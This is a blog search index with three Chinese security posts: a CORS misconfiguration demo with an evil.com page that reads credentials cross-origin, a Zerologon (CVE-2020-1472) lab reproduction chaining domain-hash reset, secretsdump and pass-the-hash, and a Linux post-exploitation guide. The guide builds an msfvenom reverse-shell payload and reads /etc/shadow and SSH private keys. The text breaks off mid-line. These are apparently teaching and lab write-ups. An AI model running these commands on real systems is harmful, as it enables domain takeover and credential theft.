<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CORS</title>
    <url>/2021/02/24/CORS/</url>
    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><hr>
<h3 id="0x00-浏览器的同源策略"><a href="#0x00-浏览器的同源策略" class="headerlink" title="0x00 浏览器的同源策略"></a>0x00 浏览器的同源策略</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>同源策略 (Same Origin Policy)</strong>,同源策略是浏览器的一个安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读取对方的资源。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但随着Web应用的发展，网站由于自身业务的其需求，需要实现一些跨域功能，能让不用域的页面之间能互相访问各自页面的内容。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;浏览器的同源目的是为了保证用户信息的安全，防止恶意的网站窃取数据。如果王爷之间不满足同源要求，将不能：</p>
<blockquote>
<ol>
<li>共享Cookie,LocalStorage,IndexDB  </li>
<li>获取DOM  </li>
<li>AJAX请求不能发送</li>
</ol>
</blockquote>
<span id="more"></span>

<h3 id="0x01-CORS介绍"><a href="#0x01-CORS介绍" class="headerlink" title="0x01 CORS介绍"></a>0x01 CORS介绍</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__CORS，跨域资源共享（Cross-origin resource sharing）__，是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CORS本质上就是使用各种头信息让浏览器与服务器之间进行交流，上面提到的名单就是用下面的http头字段来控制的： </p>
<p><img src="/2021/02/24/CORS/1.jpg"></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中比较重要的相应头为：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:<span class="regexp">//</span>a.com  	<span class="regexp">//</span>服务端接受来自http:<span class="regexp">//</span>a.com的跨域请求    </span><br><span class="line">Access-Control-Allow-Credentials: true  	<span class="regexp">//</span>表示是否允许发送Cookie，true即发送cookie</span><br></pre></td></tr></table></figure>



<h3 id="0×02-CORS漏洞的攻击流程"><a href="#0×02-CORS漏洞的攻击流程" class="headerlink" title="0×02 CORS漏洞的攻击流程"></a>0×02 CORS漏洞的攻击流程</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;假设用户登陆一个含有CORS配置网站<code>vuln.com</code>，同时又访问了攻击者提供的一个链接<code>evil.com</code>。<code>evil.com</code>的网站向<code>vuln.com</code>这个网站发起请求获取敏感数据，浏览器能否接收信息取决于<code>vuln.com</code>的配置。如果<code>vuln.com</code>配置了<code>Access-Control-Allow-Origin</code>头且为预期，那么允许接收，否则浏览器会因为同源策略而不接收。</p>
<h3 id="0×03-CORS漏洞演示"><a href="#0×03-CORS漏洞演示" class="headerlink" title="0×03 CORS漏洞演示"></a>0×03 CORS漏洞演示</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先修改host文件，加上</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span> www.vuln.com </span><br><span class="line"><span class="number">127.0.0.1</span> www.evil.com</span><br></pre></td></tr></table></figure>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样访问<a href="http://www.vuln.com就相当于服务端.服务端新建a.php./">http://www.vuln.com就相当于服务端。服务端新建a.php。</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;username: admin; password:123456&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果访问<code>http://www.vuln.com/a.php</code>，会正常输出<code>username: admin; password:123456</code></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着在hacker端构造steal.html：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- www.evil.com/steal.html  --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello I evil page. <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">loadXMLDoc</span>(<span class="params"></span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">xhr.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript">    <span class="keyword">if</span>(xhr.readyState == <span class="number">4</span> &amp;&amp; xhr.status == <span class="number">200</span>) <span class="comment">//if receive xhr response</span></span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> datas=xhr.responseText;</span></span><br><span class="line">        alert(datas);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="javascript"><span class="comment">//request vuln page</span></span></span><br><span class="line"><span class="javascript">xhr.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://www.vuln.com/a.php&quot;</span>,<span class="string">&quot;true&quot;</span>) </span></span><br><span class="line">xhr.send();</span><br><span class="line">&#125;</span><br><span class="line">loadXMLDoc();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后打开<code>http://www.evil.com/steal.html</code>，html代码的意思是通过XMLHttpRequest访问&nbsp;&nbsp;<u>vuln.com/a.php</u>，然后将获取到的内容alert出来。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是根据同源策略，这是不允许的，结果也和我想的一样：</p>
<p><img src="/2021/02/24/CORS/2.jpg"></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来改一下a.php：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Access-Control-Allow-Origin:http://www.evil.com&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;username: admin; password:123456&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>再次访问<code>http://www.evil.com/steal.html</code>，发现可以正常alert了，成功实现了跨域资源的请求。</p>
<p><img src="/2021/02/24/CORS/3.jpg"></p>
<h3 id="0×04-CORS漏洞防范"><a href="#0×04-CORS漏洞防范" class="headerlink" title="0×04 CORS漏洞防范"></a>0×04 CORS漏洞防范</h3><ul>
<li>不要盲目反射Origin头</li>
<li>严格校验Origin头，避免出现权限泄露</li>
<li>不要配置Access-Control-Allow-Origin: null</li>
<li>HTTPS网站不要信任HTTP域</li>
<li>不要信任全部自身子域，减少攻击面</li>
<li>不要配置Origin:*和Credentials: true</li>
<li>增加Vary: Origin头</li>
</ul>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-1472 Netlogon域权限提升漏洞</title>
    <url>/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="CVE-2020-1472-Netlogon域权限提升漏洞"><a href="#CVE-2020-1472-Netlogon域权限提升漏洞" class="headerlink" title="CVE-2020-1472 Netlogon域权限提升漏洞"></a>CVE-2020-1472 Netlogon域权限提升漏洞</h1><h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-漏洞信息"><a href="#0x00-漏洞信息" class="headerlink" title="0x00 漏洞信息"></a>0x00 漏洞信息</h3><p><strong>漏洞编号：</strong>CVE-2020-1472</p>
<p><strong>漏洞名称：</strong>Netlogon域权限提升</p>
<p><strong>漏洞描述：</strong>2020年08月12日， 微软官方发布了 NetLogon 特权提升漏洞 的风险通告。攻击者通过NetLogon（MS-NRPC）， 建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中 的设备上运行经特殊设计的应用程序。</p>
<p><strong>影响版本：</strong></p>
<p>Windows Server 2008 R2 for x64-based Systems Service Pack 1 </p>
<p>Windows Server 2012 </p>
<p>Windows Server 2016 </p>
<p>Windows Server 2019 </p>
<p>Windows Server, version 1903 (Server Core installation) </p>
<p>Windows Server, version 1909 (Server Core installation) </p>
<p>Windows Server, version 2004 (Server Core installation)</p>
<span id="more"></span>

<h3 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h3><p>环境：DC</p>
<p>IP    ： 192.168.31.78 /10.10.10.10</p>
<ol>
<li><h6 id="查看域控主机名称"><a href="#查看域控主机名称" class="headerlink" title="查看域控主机名称"></a>查看域控主机名称</h6></li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/1.png"></p>
<ol start="2">
<li><h6 id="检测漏洞是否存在"><a href="#检测漏洞是否存在" class="headerlink" title="检测漏洞是否存在"></a>检测漏洞是否存在</h6></li>
</ol>
<blockquote>
<p><a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 zerologon_tester.py DC <span class="number">192.168</span>.<span class="number">31.78</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/2.png"></p>
<ol start="3">
<li><h6 id="漏洞利用，重置域账号的哈希"><a href="#漏洞利用，重置域账号的哈希" class="headerlink" title="漏洞利用，重置域账号的哈希"></a>漏洞利用，重置域账号的哈希</h6></li>
</ol>
<blockquote>
<p><a href="https://github.com/blackarrowsec/redteam-research">https://github.com/blackarrowsec/redteam-research</a></p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python CVE<span class="literal">-2020</span><span class="literal">-1472</span>.py DC DC<span class="variable">$</span> <span class="number">192.168</span>.<span class="number">31.78</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/3.png"></p>
<ol start="4">
<li><h6 id="获取域控用户hash"><a href="#获取域控用户hash" class="headerlink" title="获取域控用户hash"></a>获取域控用户hash</h6></li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py <span class="string">&#x27;de1ay.com/DC$@192.168.123.136&#x27;</span> <span class="literal">-no</span><span class="literal">-pass</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/4.png"></p>
<ol start="5">
<li><h6 id="wmiexec进行hash横向连接"><a href="#wmiexec进行hash横向连接" class="headerlink" title="wmiexec进行hash横向连接"></a>wmiexec进行hash横向连接</h6></li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python wmiexec.py <span class="literal">-hashes</span> aad3b435b51404eeaad3b435b51404ee:<span class="number">3</span>b24c391862f4a8531a245a0217708c4 DC<span class="variable">$</span>/Administrator@<span class="number">192.168</span>.<span class="number">31.78</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/5.png"></p>
<ol start="6">
<li><h6 id="恢复域-获取hash"><a href="#恢复域-获取hash" class="headerlink" title="恢复域 - 获取hash"></a>恢复域 - 获取hash</h6></li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取sam数据库</span></span><br><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line">get system.save</span><br><span class="line">get sam.save</span><br><span class="line">get security.save</span><br><span class="line"><span class="built_in">del</span> /f system.save</span><br><span class="line"><span class="built_in">del</span> /f sam.save</span><br><span class="line"><span class="built_in">del</span> /f security.sav</span><br></pre></td></tr></table></figure>

<ol start="7">
<li><h6 id="恢复域-获取hash-1"><a href="#恢复域-获取hash-1" class="headerlink" title="恢复域 - 获取hash"></a>恢复域 - 获取hash</h6></li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取hash</span></span><br><span class="line">python secretsdump.py <span class="literal">-sam</span> sam.save <span class="literal">-system</span> system.save <span class="literal">-security</span> security.save LOCAL</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/6.png"></p>
<ol start="8">
<li><h6 id="恢复域"><a href="#恢复域" class="headerlink" title="恢复域"></a>恢复域</h6></li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python reinstall_original_pw.py DC <span class="number">192.168</span>.<span class="number">31.78</span> f2b1b4d01ab6f44f28634a765bc53836</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/7.png"></p>
]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux主机信息收集</title>
    <url>/2021/03/13/Linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Linux主机渗透"><a href="#0x00-Linux主机渗透" class="headerlink" title="0x00 Linux主机渗透"></a>0x00 Linux主机渗透</h3><h5 id="MSF生成LUNIX平台可执行文件"><a href="#MSF生成LUNIX平台可执行文件" class="headerlink" title="MSF生成LUNIX平台可执行文件"></a>MSF生成LUNIX平台可执行文件</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> linux/x86/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">8882</span> <span class="operator">-f</span> elf <span class="literal">-o</span> localmsf8882.elf</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/13/Linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/1.png"></p>
<p>生成linux后门时需注意位数为32还是64，和架构: 常见架构：</p>
<blockquote>
<p>32bit ：i386,i686,x86,arm </p>
<p>64bit ：x64,x86_64,amd64,arm64,aarch64</p>
</blockquote>
<span id="more"></span>

<h5 id="MSF开启handler"><a href="#MSF开启handler" class="headerlink" title="MSF开启handler"></a>MSF开启handler</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">handler <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">8882</span> <span class="literal">-p</span> linux/x86/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/13/Linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/2.png"></p>
<h5 id="上传后门至靶机-tmp目录：所有用户、用户组都具有可写权限"><a href="#上传后门至靶机-tmp目录：所有用户、用户组都具有可写权限" class="headerlink" title="上传后门至靶机 /tmp目录：所有用户、用户组都具有可写权限"></a>上传后门至靶机 /tmp目录：所有用户、用户组都具有可写权限</h5><h5 id="靶机运行后门，获取meterpreter"><a href="#靶机运行后门，获取meterpreter" class="headerlink" title="靶机运行后门，获取meterpreter"></a>靶机运行后门，获取meterpreter</h5><p><img src="/2021/03/13/Linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/3.png"></p>
<h5 id="meterpreter获取到shell默认是-bin-sh"><a href="#meterpreter获取到shell默认是-bin-sh" class="headerlink" title="meterpreter获取到shell默认是/bin/sh"></a>meterpreter获取到shell默认是/bin/sh</h5><h5 id="可以使用-python-c-“import-pty-pty-spawn-‘-bin-bash’-”切换至-bin-bash"><a href="#可以使用-python-c-“import-pty-pty-spawn-‘-bin-bash’-”切换至-bin-bash" class="headerlink" title="可以使用 python -c “import pty;pty.spawn(‘/bin/bash’);”切换至/bin/bash"></a>可以使用 python -c “import pty;pty.spawn(‘/bin/bash’);”切换至/bin/bash</h5><p><img src="/2021/03/13/Linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/4.png"></p>
<p><img src="/2021/03/13/Linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/5.png"></p>
<h3 id="0x01-Linux主机信息收集"><a href="#0x01-Linux主机信息收集" class="headerlink" title="0x01 Linux主机信息收集"></a>0x01 Linux主机信息收集</h3><h4 id="1-系统架构"><a href="#1-系统架构" class="headerlink" title="1 - 系统架构"></a>1 - 系统架构</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">uname <span class="literal">-a</span>		// 打印系统信息</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/issue		///etc/issue是一个文本文件，其中包含在登录提示之前打印的消息或系统标识</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/*<span class="literal">-release</span>	// /etc/lsb<span class="literal">-release</span>, /etc/redhat<span class="literal">-release</span> 查看操作系统发行版本。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/version	// /proc/version指定了Linux内核的版本，用于编译内核的gcc的版本以及内核</span><br><span class="line">			   编译的时间.它还包含内核编译器的用户名。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/sys/kernel/version	// /proc/sys/kernel/ 中的文件可以用来调整和监视Linux内核</span><br><span class="line">			 	   操作中的各种活动</span><br></pre></td></tr></table></figure>

<h4 id="2-进程"><a href="#2-进程" class="headerlink" title="2 - 进程"></a>2 - 进程</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ps</span> <span class="literal">-elf</span>				// 列出当前进程快照</span><br><span class="line"></span><br><span class="line"><span class="built_in">ps</span> aux				// 列出当前进程快照</span><br><span class="line"></span><br><span class="line">s <span class="literal">-al</span> /proc/			// /proc是非常特殊的，它也是一个虚拟文件系统。 它有时被称为过程</span><br><span class="line">				信息伪文件系统。它不包含“真实”文件，而是包含运行时系统信息（例</span><br><span class="line">				如系统内存，安装的设备，硬件配置等）</span><br><span class="line">							</span><br><span class="line"><span class="built_in">ls</span> <span class="literal">-al</span> /proc/<span class="number">99</span>			// 查看关于PID <span class="number">99</span>的信息		</span><br><span class="line"></span><br><span class="line">top				//top命令显示您的Linux机器的处理器活动，并显示实时管理的任务。</span><br><span class="line">				它会显示正在使用的处理器和内存以及运行进程等其他信息。按q可以退出	  </span><br></pre></td></tr></table></figure>

<h4 id="3-用户和组"><a href="#3-用户和组" class="headerlink" title="3 - 用户和组"></a>3 - 用户和组</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">id					// 找到用户的UID或GID等信息.</span><br><span class="line"></span><br><span class="line">w					// 显示登录到Linux服务器的人员.</span><br><span class="line"></span><br><span class="line">whoami					// 显示当前用户名</span><br><span class="line"></span><br><span class="line">last lastb				// 显示用户登录记录 显示用户登录失败记录</span><br><span class="line"></span><br><span class="line">lastlog					// 格式化打印上次登录日志 /var/log/lastlog 文件的内容</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd				// 有关用户信息的基于文本的数据库，可以登录系统或其他拥</span><br><span class="line">					   有正在运行的进程的操作系统用户身份。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow				// /etc/shadow用于通过限制除高度特权的用户对散列密码</span><br><span class="line">				 	   数据的访问来提高密码的安全级别。</span><br><span class="line">				 	   通常情况下，该数据保存在超级用户拥有的文件中，并且只</span><br><span class="line">				 	   能由超级用户访问。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/sudoers			// /etc/sudoers 文件内容是使用sudo命令必须遵守的规则</span><br><span class="line"></span><br><span class="line">sudo <span class="literal">-V</span>					// 打印sudo版本字符串</span><br><span class="line"></span><br><span class="line">sudo <span class="literal">-l</span>					// 列出目前用户可执行与无法执行的指令</span><br></pre></td></tr></table></figure>

<h4 id="4-SSH服务信息"><a href="#4-SSH服务信息" class="headerlink" title="4 - SSH服务信息"></a>4 - SSH服务信息</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.ssh/authorized_keys		// 使用公钥认证，认证实体具有公钥和私钥。私钥保存在登录</span><br><span class="line">					   的计算机上,公钥存在要登录的所有计算机上 .ssh/authorized_keys 文件中。</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa.pub			// RSA 公钥 会保存为 .ssh/id_rsa.pub.</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa			// RSA 私钥 会保存在你的home目录中 ：.ssh/id_rsa</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/ssh_config			// OpenSSH SSH 控制端配置文件</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/sshd_config		// OpenSSH SSH 服务端配置文件</span><br><span class="line"></span><br><span class="line">密钥登录</span><br><span class="line"></span><br><span class="line">ssh<span class="literal">-keygen</span>					// 生成密钥对，私钥保存在你登录的计算机上公</span><br><span class="line">						  钥存储在要登录的所有计算机上的.ssh/authorized_keys 文件中。</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa.pub &gt;&gt; authorized_keys	// 安装公钥</span><br><span class="line">chmod <span class="number">600</span> ~/.ssh/authorized_keys</span><br><span class="line">chmod <span class="number">600</span> ~/.ssh/id_rsa</span><br><span class="line">chmod <span class="number">700</span> ~/.ssh				// 设置权限		</span><br><span class="line">vim /etc/ssh/sshd_config			// 编辑服务端配置文件</span><br><span class="line"></span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">PermitRootLogin yes				// [可选]禁用密码登录</span><br><span class="line">PasswordAuthentication no</span><br><span class="line"></span><br><span class="line">service sshd restart				// 重启ssh服务</span><br></pre></td></tr></table></figure>

<h4 id="5-服务状态"><a href="#5-服务状态" class="headerlink" title="5 - 服务状态"></a>5 - 服务状态</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">service -<span class="literal">-status</span><span class="literal">-all</span>				// 检查所有服务状态</span><br><span class="line">systemctl <span class="literal">-a</span>					// 列出安装在文件系统中的所有单元.</span><br><span class="line">service servicename <span class="built_in">start</span></span><br><span class="line">systemctl <span class="built_in">start</span> servicename			// 启动某个服务</span><br><span class="line">service servicename stop</span><br><span class="line">systemctl stop servicename			// 停止某个服务</span><br><span class="line">service servicename status</span><br><span class="line">systemctl status servicename			// 显示某个服务状态信息</span><br><span class="line"><span class="built_in">cat</span> /etc/services				// /etc/services将端口号映射到指定的服务</span><br></pre></td></tr></table></figure>

<h4 id="6-安全-iptables"><a href="#6-安全-iptables" class="headerlink" title="6 - 安全 - iptables"></a>6 - 安全 - iptables</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">iptables <span class="literal">-L</span>				// 列出所有规则链。</span><br><span class="line">iptables <span class="operator">-F</span>				// 删除选定规则链中的所有规则.</span><br><span class="line">iptables <span class="literal">-A</span> INPUT <span class="literal">-p</span> icmp <span class="literal">-m</span> icmp –icmp<span class="literal">-type</span> <span class="number">0</span> <span class="literal">-j</span> ACCEPT</span><br><span class="line">					// 请执行iptables <span class="literal">-p</span> icmp –help 获得更多信息.</span><br><span class="line">					</span><br><span class="line">iptables <span class="literal">-A</span> INPUT <span class="literal">-p</span> tcp <span class="literal">-m</span> tcp –sport <span class="number">80</span> <span class="literal">-m</span> state –state RELATED,ESTABLISHED <span class="literal">-j</span> ACCEPT</span><br><span class="line">            	// 允许来自src端口<span class="number">80</span>的tcp连接</span><br><span class="line">            	// <span class="literal">-A</span> 新增一条规则 , INPUT[入方向],OUTPUT[出方向]</span><br><span class="line">            	// <span class="literal">-p</span> 协议类型</span><br><span class="line">            	// <span class="literal">-sport</span> 源端口 <span class="literal">-dport</span> 目标端口</span><br><span class="line">            	// <span class="literal">-j</span> 处理数据包的动作，ACCEPT 、DROP</span><br><span class="line"></span><br><span class="line">iptables <span class="literal">-A</span> OUTPUT <span class="literal">-p</span> tcp <span class="literal">-m</span> tcp <span class="literal">-dport</span> <span class="number">80</span> <span class="literal">-m</span> state –state NEW,RELATED,ESTABLISHED <span class="literal">-j</span> ACCEPT</span><br><span class="line">				// 允许 从/到 dst 端口<span class="number">80</span>的TCP连接.</span><br><span class="line">			</span><br><span class="line">iptables <span class="literal">-A</span> INPUT <span class="literal">-p</span> udp <span class="literal">-m</span> udp –sport <span class="number">53</span> <span class="literal">-m</span> state –state RELATED,ESTABLISHED <span class="literal">-j</span> ACCEPT</span><br><span class="line">				// 允许来自src端口<span class="number">80</span>的udp连接</span><br><span class="line"></span><br><span class="line">iptables <span class="literal">-A</span> OUTPUT <span class="literal">-p</span> udp <span class="literal">-m</span> udp –dport <span class="number">53</span> <span class="literal">-m</span> state –state NEW,RELATED,ESTABLISHED <span class="literal">-j</span> ACCEPT</span><br><span class="line">				// 允许从/到 dst 端口<span class="number">53</span>的udp连接.</span><br><span class="line">                </span><br><span class="line">iptables <span class="literal">-A</span> OUTPUT <span class="literal">-p</span> tcp <span class="literal">-m</span> tcp –sport <span class="number">55552</span> <span class="literal">-s</span> <span class="number">127.0</span>.<span class="number">0.1</span> <span class="literal">-d</span> <span class="number">127.0</span>.<span class="number">0.1</span> <span class="literal">-j</span> ACCEPT</span><br><span class="line">iptables <span class="literal">-A</span> OUTPUT <span class="literal">-p</span> tcp <span class="literal">-m</span> tcp –dport <span class="number">55552</span> <span class="literal">-s</span> <span class="number">127.0</span>.<span class="number">0.1</span> <span class="literal">-d</span> <span class="number">127.0</span>.<span class="number">0.1</span> <span class="literal">-j</span> ACCEPT</span><br><span class="line">				// 允许本地主机连接到 localhost:<span class="number">55552</span></span><br><span class="line">				// <span class="literal">-s</span> 原地址ip <span class="literal">-d</span> 目标地址ip</span><br><span class="line">				// <span class="literal">-i</span> 指定数据包从哪块网卡进入<span class="literal">-o</span>指定数据包从哪块网卡输出</span><br></pre></td></tr></table></figure>

<h4 id="7-网络"><a href="#7-网络" class="headerlink" title="7 - 网络"></a>7 - 网络</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ifconfig <span class="literal">-a</span>				// 显示当前可用的所有接口</span><br><span class="line"></span><br><span class="line">hostname				// 显示或设置系统的主机名称。</span><br><span class="line"></span><br><span class="line">netstat <span class="literal">-antp</span>				// 显示网络状态</span><br><span class="line"></span><br><span class="line">netstat <span class="literal">-anup</span>				// 显示网络状态</span><br><span class="line"></span><br><span class="line">lsof <span class="literal">-nPi</span>				// 列出打开的文件</span><br><span class="line"></span><br><span class="line">route <span class="literal">-e</span>				//显示/操作IP路由表</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/resolv.conf			//该文件是DNS域名解析的配置文件，它的格式很简单，每行</span><br><span class="line">					  以一个关键字开头，后接配置参数。resolv.conf的关键</span><br><span class="line">					  字主要有四个，分别是：`nameserver :定义DNS服务器的IP地址</span><br><span class="line"><span class="built_in">cat</span> /etc/hosts				// /etc/hosts是一个简单的文本文件,将IP地址与主机名相</span><br><span class="line">					  关联，每个IP地址一行。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/network/interfaces		// /etc/network/interfaces 文件包含网络接口配置信息。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/sysconfig/network		// /etc/sysconfig/network 文件用于指定有关服务器上所</span><br><span class="line">					  需网络配置的信息。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/networks			// /etc/networks是一个简单的ASCII文件,描述这些网络已</span><br><span 